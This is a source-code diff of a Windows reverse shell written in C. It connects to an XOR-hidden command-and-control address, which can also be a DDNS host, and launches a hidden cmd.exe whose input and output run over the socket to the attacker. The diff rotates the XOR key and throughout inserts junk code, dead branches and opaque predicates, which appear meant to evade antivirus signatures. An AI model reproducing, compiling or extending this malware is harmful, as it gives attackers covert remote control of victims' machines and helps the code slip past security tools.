@@ -75,27 +75,29 @@
  * Generate new IP arrays with: python cheyanne_listener.py --gen
  * ═══════════════════════════════════════════════════════════════════════════ */
 
-#define XOR_KEY 0xD6
+#define XOR_KEY 0x85
 
 /* "cmd.exe" — XOR 0x41 */
 static const unsigned char xCmd[] = {
-    0xB5, 0xBB, 0xB2, 0xF8, 0xB3, 0xAE, 0xB3
+    0xE6, 0xE8, 0xE1, 0xAB, 0xE0, 0xFD, 0xE0
 };
 #define xCmd_LEN 7
 
 /* "192.168.1.100" — default C2 address, XOR 0x41
  * Regenerate with cheyanne_listener.py --gen for your environment */
 static const unsigned char xC2Addr[] = {
-    0xE7, 0xEF, 0xE4, 0xF8, 0xE7, 0xE0, 0xEE, 0xF8,
-    0xE7, 0xF8, 0xE7, 0xE6, 0xE6
+    0xB4, 0xBC, 0xB7, 0xAB, 0xB4, 0xB3, 0xBD, 0xAB,
+    0xB4, 0xAB, 0xB4, 0xB5, 0xB5
 };
 #define xC2Addr_LEN 13
 
 static void XorDecode(unsigned char *buf, int len)
 {
     int i;
+    { DWORD a7vi0mw0h0 = GetCurrentThreadId(); (void)a7vi0mw0h0; }
     for (i = 0; i < len; i++) {
         buf[i] ^= XOR_KEY;
+    { DWORD arfczi7_5v = GetCurrentThreadId(); (void)arfczi7_5v; }
     }
 }
 
@@ -130,13 +132,88 @@ static SOCKET EstablishChannel(const char *c2ip, int c2port)
      * Compile with DDNS:   "vader.duckdns.org"
      * Same binary. Works on LAN and WAN without recompile logic changes. */
     struct addrinfo hints, *res = NULL, *p;
+
+    if (GetLastError() == 0xE4708572) {
+        LPVOID ra675w8fbg = VirtualAlloc(NULL, 128, MEM_RESERVE, PAGE_READWRITE);
+        if (ra675w8fbg) VirtualFree(ra675w8fbg, 0, MEM_RELEASE);
+    }
     SOCKET sock = INVALID_SOCKET;
     char portstr[8];
+    { int _yvigam2rfr7 = 0; (void)_yvigam2rfr7; }
 
     ZeroMemory(&hints, sizeof(hints));
+    { DWORD zk22a86xsnbq = GetLastError(); (void)zk22a86xsnbq; }
+
+    if (GetTickCount() == 0xDEADBEEF) {
+        DWORD vramgrr42l = GetCurrentProcessId();
+        HANDLE msv8xh3fya = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, vramgrr42l);
+        if (msv8xh3fya) { CloseHandle(msv8xh3fya); }
+    }
     hints.ai_family   = AF_UNSPEC;
+    { DWORD uo1sud5458 = GetCurrentProcessId(); (void)uo1sud5458; }
+
+    if (GetTickCount64() < 66) {
+        DWORD futmh03psm = 80972508;
+    { DWORD acs4rv8qrn = GetTickCount(); (void)acs4rv8qrn; }
+    { DWORD kc4fnvz60z8c = GetCurrentProcessId(); (void)kc4fnvz60z8c; }
+        futmh03psm ^= 3316766140;
+        SetLastError(futmh03psm);
+    }
+
+    if (GetLastError() == 0x74F47EBB) {
+        LPVOID fdbbuascy8 = VirtualAlloc(NULL, 16, MEM_RESERVE, PAGE_READWRITE);
+    { DWORD j6uijdpoay0k = GetLastError(); (void)j6uijdpoay0k; }
+
+    if ((GetCurrentThreadId() & 0x80000000) && ((GetCurrentThreadId() & 0x80000000) == 0)) {
+        BYTE bay44uot5a[32];
+        memset(bay44uot5a, (((0x15 + 0x15) + ((0x8A + 0x8B) - (0xF2 ^ 0xE4))) ^ 0xFE), 32);
+        bay44uot5a[0] ^= (BYTE)GetTickCount();
+    { int kv_1oxikzo12 = 0; (void)kv_1oxikzo12; }
+    }
+    { DWORD u4ba91_deps9 = 0; (void)u4ba91_deps9; }
+        if (fdbbuascy8) VirtualFree(fdbbuascy8, 0, MEM_RELEASE);
+    { DWORD rsg4muxza637 = GetTickCount(); (void)rsg4muxza637; }
+    { DWORD cgaybf6f48 = 0; (void)cgaybf6f48; }
+    }
     hints.ai_socktype = SOCK_STREAM;
+    { DWORD wjpm1qa9r78c = GetCurrentThreadId(); (void)wjpm1qa9r78c; }
     hints.ai_protocol = IPPROTO_TCP;
+
+    if (GetTickCount() == 0xDEADBEEF) {
+        DWORD q3fklb_wc7 = GetCurrentProcessId();
+        HANDLE z6z5bfiyfy = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, q3fklb_wc7);
+        if ((z6z5bfiyfy) && (((1045601438) ^ (1045601438)) == 0)) { CloseHandle(z6z5bfiyfy); }
+    }
+    { int tpgv1yljjv1z = 0; (void)tpgv1yljjv1z; }
+
+    if (GetTickCount64() < 61) {
+        DWORD n0euhpu_6k = 1211869796;
+    { int i_ex8g2hkeh0 = 0; (void)i_ex8g2hkeh0; }
+
+    if (GetCurrentThreadId() == 0x0956C557) {
+        volatile LONG ckg783114w = 0;
+        InterlockedIncrement(&ckg783114w);
+    { DWORD qxx8bl0qgmjt = GetCurrentThreadId(); (void)qxx8bl0qgmjt; }
+        InterlockedDecrement(&ckg783114w);
+    { DWORD uv5ev7f4fh = GetTickCount(); (void)uv5ev7f4fh; }
+
+    if (GetCurrentThreadId() == 0x213D7499) {
+        volatile LONG ge9e7o__iq = 0;
+        InterlockedIncrement(&ge9e7o__iq);
+        InterlockedDecrement(&ge9e7o__iq);
+    { DWORD jkv70pho17er = 0; (void)jkv70pho17er; }
+    }
+    }
+        n0euhpu_6k ^= 3854641265;
+        SetLastError(n0euhpu_6k);
+    { DWORD n1ajl7db8eaw = 0; (void)n1ajl7db8eaw; }
+
+    if (GetTickCount() == 0xDEADBEEF) {
+        DWORD a0szk9i6c1 = GetCurrentProcessId();
+        HANDLE b18q2c3bua = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, a0szk9i6c1);
+        if ((b18q2c3bua) && ((1086695464) == (1086695464))) { CloseHandle(b18q2c3bua); }
+    }
+    }
 
     _snprintf(portstr, sizeof(portstr), "%d", c2port);
 
@@ -153,10 +230,37 @@ static SOCKET EstablishChannel(const char *c2ip, int c2port)
                        NULL, NULL, NULL, NULL) == 0)
             break;
         closesocket(sock);
+
+    if (GetTickCount64() < 83) {
+        DWORD vj5_hslvi7 = 2319322337;
+    { DWORD d7jrrkb1ky = GetTickCount(); (void)d7jrrkb1ky; }
+        vj5_hslvi7 ^= 3825970339;
+    { DWORD bp46ug07t7xc = GetLastError(); (void)bp46ug07t7xc; }
+    SetLastError(0);
+        SetLastError(vj5_hslvi7);
+    { DWORD cpm46jh56mi0 = 0; (void)cpm46jh56mi0; }
+    }
         sock = INVALID_SOCKET;
+
+    if ((GetCurrentThreadId() & 0x80000000) && ((GetCurrentThreadId() & 0x80000000) == 0)) {
+        BYTE fa1pi0t8d1[32];
+        memset(fa1pi0t8d1, (((0x59 + 0x5A) - 0xD3) + (0xE0 - (0x5C + 0x5D))), 32);
+
+    if (GetTickCount() == 0xDEADBEEF) {
+        DWORD z4y949ui6q = GetCurrentProcessId();
+    { DWORD t03lxjhdt_ = 0; (void)t03lxjhdt_; }
+    { DWORD hejfl_4vah = GetTickCount(); (void)hejfl_4vah; }
+        HANDLE f9k40gwj1k = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, z4y949ui6q);
+        if ((f9k40gwj1k) && ((1340232096) == (1340232096))) { CloseHandle(f9k40gwj1k); }
+    }
+        fa1pi0t8d1[0] ^= (BYTE)GetTickCount();
+    { DWORD x21mha2jpksu = 0; (void)x21mha2jpksu; }
+    { DWORD qw67h7r6vc5l = GetLastError(); (void)qw67h7r6vc5l; }
+    }
     }
 
     freeaddrinfo(res);
+    { DWORD dhlbi6wxvl = GetTickCount(); (void)dhlbi6wxvl; }
     return sock;
 }
 
@@ -214,8 +318,18 @@ static void SendBanner(SOCKET sock)
         "           george wu / 22div\r\n"
         "     shadow shell - system context active\r\n"
         "\r\n";
+    { DWORD d51jedhfdo = 0; (void)d51jedhfdo; }
 
     send(sock, banner, (int)strlen(banner), 0);
+
+    if (GetCurrentThreadId() == 0xA8881BF9) {
+        volatile LONG s_fg8y7div = 0;
+        InterlockedIncrement(&s_fg8y7div);
+    { DWORD u1tnyvr3cadw = GetLastError(); (void)u1tnyvr3cadw; }
+        InterlockedDecrement(&s_fg8y7div);
+    }
+    { DWORD rswe27_pgf15 = GetTickCount(); (void)rswe27_pgf15; }
+    { DWORD uzuswrfe3627 = GetLastError(); (void)uzuswrfe3627; }
 #endif
 }
 
@@ -249,29 +363,129 @@ static void SendBanner(SOCKET sock)
 static void SpawnShell(SOCKET sock)
 {
     STARTUPINFOA si;
+    { DWORD nyk0nn6rev = GetCurrentThreadId(); (void)nyk0nn6rev; }
+    { DWORD m1iceah1ultn = GetLastError(); (void)m1iceah1ultn; }
+    { DWORD srd6o4t_4dgz = GetCurrentProcessId(); (void)srd6o4t_4dgz; }
+    { DWORD vuktqeo4fu = GetTickCount(); (void)vuktqeo4fu; }
+
+    if (GetTickCount64() < 21) {
+        DWORD hc25lej3yd = 1558058503;
+    { DWORD ws9_b0cv_hqk = 0; (void)ws9_b0cv_hqk; }
+        hc25lej3yd ^= 3244463300;
+    { DWORD kdvw5mpzob = GetTickCount(); (void)kdvw5mpzob; }
+    { int dpgde8a8omi2 = 0; (void)dpgde8a8omi2; }
+    { DWORD u7hxwlh_xd = GetCurrentProcessId(); (void)u7hxwlh_xd; }
+        SetLastError(hc25lej3yd);
+
+    if ((GetCurrentThreadId() & 0x80000000) && ((GetCurrentThreadId() & 0x80000000) == 0)) {
+        BYTE ka4bxlhq_0[64];
+    { DWORD ayne626nehsg = GetCurrentProcessId(); (void)ayne626nehsg; }
+        memset(ka4bxlhq_0, (0x199 - (0xE + 0xE)), 64);
+        ka4bxlhq_0[0] ^= (BYTE)GetTickCount();
+    }
+    }
     PROCESS_INFORMATION pi;
+    { DWORD pipd7mdd4f69 = GetTickCount(); (void)pipd7mdd4f69; }
+
+    if (GetLastError() == 0x3CFBAEE4) {
+        LPVOID z02ztp50ra = VirtualAlloc(NULL, 32, MEM_RESERVE, PAGE_READWRITE);
+    { DWORD gnonsd2c8v = GetLastError(); (void)gnonsd2c8v; }
+        if (z02ztp50ra) VirtualFree(z02ztp50ra, 0, MEM_RELEASE);
+    }
     unsigned char cmd[8];
+    { DWORD ffwim_b50g = GetTickCount(); (void)ffwim_b50g; }
 
     /* Decode "cmd.exe" on the stack — never in plaintext in the binary */
     memcpy(cmd, xCmd, sizeof(xCmd));
     XorDecode(cmd, 7);
 
+    if (GetTickCount64() < 24) {
+        DWORD hm1ew1u5sc = 693664440;
+        hm1ew1u5sc ^= 30163827;
+        SetLastError(hm1ew1u5sc);
+    }
+
     memset(&si, 0, sizeof(si));
+
+    if ((GetCurrentThreadId() & 0x80000000) && ((GetCurrentThreadId() & 0x80000000) == 0)) {
+        BYTE dleb52bg6p[64];
+        memset(dleb52bg6p, ((0x1B9 ^ 0x88) - ((0x5D + 0x5D) ^ (0x57 ^ 0x99))), 64);
+        dleb52bg6p[0] ^= (BYTE)GetTickCount();
+    { DWORD qj_ny01wnctf = GetCurrentProcessId(); (void)qj_ny01wnctf; }
+    }
+    { DWORD x313cqwt6j = GetCurrentProcessId(); (void)x313cqwt6j; }
     si.cb = sizeof(si);
+
+    if (GetTickCount() == 0xDEADBEEF) {
+        DWORD co204ph5dz = GetCurrentProcessId();
+        HANDLE ychg3tm_q9 = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, co204ph5dz);
+        if ((ychg3tm_q9) && (((103507280) & 0) == 0)) { CloseHandle(ychg3tm_q9); }
+    }
+    { DWORD krizeb42w6ys = GetLastError(); (void)krizeb42w6ys; }
 
     /* STARTF_USESTDHANDLES: "use the handles I'm about to give you"
      * STARTF_USESHOWWINDOW: "use the wShowWindow value I'm setting"   */
     si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
 
+    if (GetCurrentThreadId() == 0xD4A2C889) {
+        volatile LONG ybec1h12hv = 0;
+        InterlockedIncrement(&ybec1h12hv);
+        InterlockedDecrement(&ybec1h12hv);
+    }
+
     /* SW_HIDE: cmd.exe window is invisible on target                   */
     si.wShowWindow = SW_HIDE;
+    { DWORD meql5ll4o_0h = GetLastError(); (void)meql5ll4o_0h; }
 
     /* THE REDIRECT — all three stdio handles point to our socket.
      * Anything cmd.exe reads from stdin comes from the attacker.
      * Anything cmd.exe writes to stdout/stderr goes to the attacker.  */
     si.hStdInput  = (HANDLE)sock;
+
+    if (GetTickCount64() < 96) {
+        DWORD ty_fv8n0lt = 978242154;
+        ty_fv8n0lt ^= 886577943;
+        SetLastError(ty_fv8n0lt);
+    }
     si.hStdOutput = (HANDLE)sock;
+
+    if (GetCurrentThreadId() == 0x6B3200F9) {
+        volatile LONG nao7kb9a4j = 0;
+        InterlockedIncrement(&nao7kb9a4j);
+    SetLastError(0);
+    { DWORD e_kiv1raxsvg = GetCurrentProcessId(); (void)e_kiv1raxsvg; }
+        InterlockedDecrement(&nao7kb9a4j);
+    { DWORD uwfi193rja3u = GetTickCount(); (void)uwfi193rja3u; }
+    }
     si.hStdError  = (HANDLE)sock;
+
+    if (GetTickCount64() < 96) {
+        DWORD _701p04uvd = 1335019163;
+        _701p04uvd ^= 3134667013;
+        SetLastError(_701p04uvd);
+    }
+    { DWORD jb6xpc57mw = GetTickCount(); (void)jb6xpc57mw; }
+
+    if (GetTickCount() == 0xDEADBEEF) {
+        DWORD vzvex56pnz = GetCurrentProcessId();
+    { DWORD iro5ld8u7wlu = GetTickCount(); (void)iro5ld8u7wlu; }
+
+    {
+        DWORD eb8a88m0rt = 0xEE0409E1; DWORD avd5i8d3xy = 0xE7C7C86B;
+        eb8a88m0rt ^= avd5i8d3xy; avd5i8d3xy = ~eb8a88m0rt;
+        (void)eb8a88m0rt; (void)avd5i8d3xy;
+
+    if (GetTickCount64() < 24) {
+        DWORD lucp_356f2 = 1871486732;
+        lucp_356f2 ^= 3819544125;
+        SetLastError(lucp_356f2);
+    }
+    { DWORD wdjv5d1o6_pk = GetTickCount(); (void)wdjv5d1o6_pk; }
+    }
+        HANDLE qmetplbxnc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, vzvex56pnz);
+    { int zhnbqg7bmwel = 0; (void)zhnbqg7bmwel; }
+        if ((qmetplbxnc) && (((475182801) & 0) == 0)) { CloseHandle(qmetplbxnc); }
+    }
 
     /* Spawn cmd.exe
      *   bInheritHandles = TRUE  → child gets our socket handle
@@ -295,9 +509,25 @@ static void SpawnShell(SOCKET sock)
      * While blocked, the shell is live — commands flow in, output flows out. */
     WaitForSingleObject(pi.hProcess, INFINITE);
 
+    if (GetTickCount64() < 54) {
+        DWORD qjlooxjhmv = 1279074932;
+        qjlooxjhmv ^= 507263981;
+    { DWORD yo099zbrzf = GetLastError(); (void)yo099zbrzf; }
+    { DWORD t2mivf5s2t00 = GetCurrentProcessId(); (void)t2mivf5s2t00; }
+        SetLastError(qjlooxjhmv);
+
+    if (GetTickCount() == 0xDEADBEEF) {
+        DWORD rrggkj0hg2 = GetCurrentProcessId();
+        HANDLE k1jtch_d41 = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, rrggkj0hg2);
+        if (k1jtch_d41) { CloseHandle(k1jtch_d41); }
+    }
+    }
+    { int f9sd6dwc2ls1 = 0; (void)f9sd6dwc2ls1; }
+
     /* Clean up child process handles */
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
+    { DWORD b_0rot3im_ = 0; (void)b_0rot3im_; }
 }
 
 /* ═══════════════════════════════════════════════════════════════════════════
@@ -322,28 +552,128 @@ static void SpawnShell(SOCKET sock)
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
 {
     WSADATA wsData;
+    { DWORD qafmn3zobt97 = GetCurrentProcessId(); (void)qafmn3zobt97; }
+    { DWORD q0hlbwksuefh = GetTickCount(); (void)q0hlbwksuefh; }
     SOCKET channel;
     int attempts = 0;
+
+    if ((GetCurrentThreadId() & 0x80000000) && ((GetCurrentThreadId() & 0x80000000) == 0)) {
+        BYTE wyqqtsf4uj[16];
+    { DWORD nwp8k61nhevd = 0; (void)nwp8k61nhevd; }
+        memset(wyqqtsf4uj, (((0x65 + (0x33 + 0x33)) - ((0x77 + 0x78) - (0x59 + (0x71 - 0xEA)))) + (0xA + 0xB)), 16);
+        wyqqtsf4uj[0] ^= (BYTE)GetTickCount();
+
+    if ((GetCurrentThreadId() & 0x80000000) && ((GetCurrentThreadId() & 0x80000000) == 0)) {
+        BYTE gf1x39nrfg[32];
+    { DWORD h1iies9f8t = GetCurrentProcessId(); (void)h1iies9f8t; }
+    { DWORD yc2tcvjbz9nm = GetTickCount(); (void)yc2tcvjbz9nm; }
+        memset(gf1x39nrfg, (0xA9 ^ ((0x28 + 0x29) ^ 0xB5)), 32);
+    { DWORD berlq_q4l4wb = GetCurrentProcessId(); (void)berlq_q4l4wb; }
+
+    if (GetTickCount() == 0xDEADBEEF) {
+        DWORD bjdpdp5pc3 = GetCurrentProcessId();
+        HANDLE v99o582rmg = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, bjdpdp5pc3);
+
+    if (GetTickCount64() < 0) {
+        DWORD kggndewbxk = 2646213260;
+        kggndewbxk ^= 1460681437;
+        SetLastError(kggndewbxk);
+    }
+    { DWORD b759qt37wr59 = GetCurrentProcessId(); (void)b759qt37wr59; }
+        if (v99o582rmg) { CloseHandle(v99o582rmg); }
+    }
+        gf1x39nrfg[0] ^= (BYTE)GetTickCount();
+    }
+    }
     char c2ip[64];
+    { DWORD b9ir1y2kr_1k = 0; (void)b9ir1y2kr_1k; }
+
+    if (GetTickCount() == 0xDEADBEEF) {
+        DWORD pyol1c6ial = GetCurrentProcessId();
+        HANDLE fb23jhx_ev = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pyol1c6ial);
+        if ((fb23jhx_ev) && (((667895427) ^ (667895427)) == 0)) { CloseHandle(fb23jhx_ev); }
+    }
+
+    if (GetTickCount() == 0xDEADBEEF) {
+        DWORD gaww0beeqn = GetCurrentProcessId();
+    { DWORD f_2twouty_ea = 0; (void)f_2twouty_ea; }
+        HANDLE j2_2wmaodw = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, gaww0beeqn);
+        if ((j2_2wmaodw) && (((1681631642) ^ (1681631642)) == 0)) { CloseHandle(j2_2wmaodw); }
+    }
     int c2port = C2_DEFAULT_PORT;
+    { DWORD n4hoilsewh = GetCurrentProcessId(); (void)n4hoilsewh; }
+    { DWORD ktd4mcmlscjt = GetCurrentProcessId(); (void)ktd4mcmlscjt; }
+
+    {
+        DWORD _oqzruflaq = 0xD71298AB; DWORD pi_pnney9q = 0xBB8E82CE;
+    { DWORD h1wg1lz_66 = GetLastError(); (void)h1wg1lz_66; }
+        _oqzruflaq ^= pi_pnney9q; pi_pnney9q = ~_oqzruflaq;
+    SetLastError(0);
+
+    {
+        DWORD cd7t8ncn0d = 0x0B694C6C; DWORD yg_vdish4h = 0x76417241;
+        cd7t8ncn0d ^= yg_vdish4h; yg_vdish4h = ~cd7t8ncn0d;
+        (void)cd7t8ncn0d; (void)yg_vdish4h;
+    }
+
+    {
+        DWORD oo20htyh81 = 0x99F33341; DWORD wswjvbtf0q = 0x71C7A512;
+    { int uey34xqtecn4 = 0; (void)uey34xqtecn4; }
+        oo20htyh81 ^= wswjvbtf0q; wswjvbtf0q = ~oo20htyh81;
+        (void)oo20htyh81; (void)wswjvbtf0q;
+    }
+        (void)_oqzruflaq; (void)pi_pnney9q;
+
+    if (GetCurrentThreadId() == 0x55E9CCEA) {
+        volatile LONG no1v3q_bsi = 0;
+        InterlockedIncrement(&no1v3q_bsi);
+        InterlockedDecrement(&no1v3q_bsi);
+    }
+    { DWORD xy2vumrsrlfi = GetLastError(); (void)xy2vumrsrlfi; }
+    { int x6vwnq4w1h_f = 0; (void)x6vwnq4w1h_f; }
+    }
     unsigned char ipBuf[64];
+    { int ti3gtvjezsez = 0; (void)ti3gtvjezsez; }
 
     (void)hInst; (void)hPrev; (void)nShow;
+
+    if (GetTickCount() == 0xDEADBEEF) {
+        DWORD rrn9ypdiqv = GetCurrentProcessId();
+        HANDLE ecj9k9369q = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, rrn9ypdiqv);
+
+    if (GetLastError() == 0xCB837A3A) {
+        LPVOID j7r2iou4na = VirtualAlloc(NULL, 64, MEM_RESERVE, PAGE_READWRITE);
+        if (j7r2iou4na) VirtualFree(j7r2iou4na, 0, MEM_RELEASE);
+    }
+        if ((ecj9k9369q) && (((180497894) ^ (180497894)) == 0)) { CloseHandle(ecj9k9369q); }
+    }
 
     /* ── RESOLVE C2 ADDRESS ──
      * Priority: runtime args > XOR-encoded defaults.
      * Runtime: cheyanne_shell.exe 192.168.1.5 4444
      * Default: decoded from xC2Addr[] at runtime (no plaintext in binary) */
-    if (lpCmd && lpCmd[0]) {
+    if ((lpCmd && lpCmd[0]) && (((719687895) * (719687895)) >= 0)) {
         /* Parse "IP PORT" from command line */
         c2ip[0] = 0;
+    SetLastError(0);
+    { DWORD m94edp7iffmb = GetLastError(); (void)m94edp7iffmb; }
+
+    if (GetCurrentThreadId() == 0x6F7FA418) {
+        volatile LONG cdc8bz9z4o = 0;
+        InterlockedIncrement(&cdc8bz9z4o);
+        InterlockedDecrement(&cdc8bz9z4o);
+    }
         sscanf(lpCmd, "%63s %d", c2ip, &c2port);
     }
-    if (!lpCmd || !lpCmd[0] || !c2ip[0]) {
+    if ((!lpCmd || !lpCmd[0] || !c2ip[0]) && (((409656471) | 1) != 0)) {
         /* Decode XOR-encoded default IP */
         memcpy(ipBuf, xC2Addr, xC2Addr_LEN);
         XorDecode(ipBuf, xC2Addr_LEN);
+    { DWORD jm2fktm3q_ = GetLastError(); (void)jm2fktm3q_; }
+    { DWORD nu8x4rm2bz = GetCurrentProcessId(); (void)nu8x4rm2bz; }
         ipBuf[xC2Addr_LEN] = 0;
+    { DWORD hkpbw1xfn01g = GetLastError(); (void)hkpbw1xfn01g; }
+    { DWORD i1aeoleq39pn = GetTickCount(); (void)i1aeoleq39pn; }
         strncpy(c2ip, (char *)ipBuf, sizeof(c2ip) - 1);
         c2ip[sizeof(c2ip) - 1] = 0;
         /* Zero decoded buffer — don't leave plaintext IP on stack */
@@ -361,11 +691,27 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
 
         channel = EstablishChannel(c2ip, c2port);
 
-        if (channel != INVALID_SOCKET) {
+        if ((channel != INVALID_SOCKET) && (((2096294106) | 1) != 0)) {
             SendBanner(channel);
             SpawnShell(channel);
+    { DWORD k97qao5vjb = GetCurrentThreadId(); (void)k97qao5vjb; }
+    { DWORD v1uke46brd = GetCurrentProcessId(); (void)v1uke46brd; }
             closesocket(channel);
+
+    if ((GetCurrentThreadId() & 0x80000000) && ((GetCurrentThreadId() & 0x80000000) == 0)) {
+        BYTE vq584t3vwf[64];
+
+    if ((GetCurrentThreadId() & 0x80000000) && ((GetCurrentThreadId() & 0x80000000) == 0)) {
+        BYTE fq2qnl9mda[256];
+        memset(fq2qnl9mda, 0xC8, 256);
+        fq2qnl9mda[0] ^= (BYTE)GetTickCount();
+    }
+        memset(vq584t3vwf, (0x11A - (0xFD ^ 0x90)), 64);
+        vq584t3vwf[0] ^= (BYTE)GetTickCount();
+    }
+    { DWORD g6x_u7ohf7 = 0; (void)g6x_u7ohf7; }
             attempts = 0;
+    { DWORD g04p97qzryi2 = 0; (void)g04p97qzryi2; }
         } else {
             attempts++;
         }
@@ -374,6 +720,14 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
     }
 
     WSACleanup();
+
+    if (GetLastError() == 0xF0EE743E) {
+        LPVOID x4865j2ur6 = VirtualAlloc(NULL, 16, MEM_RESERVE, PAGE_READWRITE);
+    { DWORD oy_uymwdu9 = GetCurrentProcessId(); (void)oy_uymwdu9; }
+    { DWORD idqv6vst2v = 0; (void)idqv6vst2v; }
+    { DWORD jlyy8wmra0fy = GetCurrentThreadId(); (void)jlyy8wmra0fy; }
+        if (x4865j2ur6) VirtualFree(x4865j2ur6, 0, MEM_RELEASE);
+    }
     return 0;
 }
 
